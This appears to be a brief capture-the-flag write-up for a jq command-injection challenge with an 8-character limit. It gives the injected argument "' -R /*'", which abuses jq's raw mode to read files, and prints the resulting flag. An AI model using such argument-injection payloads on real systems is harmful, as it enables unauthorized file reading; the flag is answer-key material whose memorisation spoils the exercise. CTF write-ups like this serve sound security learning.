---
ai_date: '2025-04-27 05:23:41'
ai_summary: Command injection via 'raw' mode in jq, exploiting with limited characters
ai_tags:
- cmd-inj
- jq
- 8char-limit
created: 2024-06-22T18:48
points: 199
solves: 92
updated: 2024-08-05T09:51
---

Command injection, except I can't use commands, because its 8 char max.

Well jq has a raw mode `-R`, so we will use that

```
' -R /*'
"FLAG{jqj6jqjqjqjqjqj6jqjqjqjqj6jqjqjq}"
```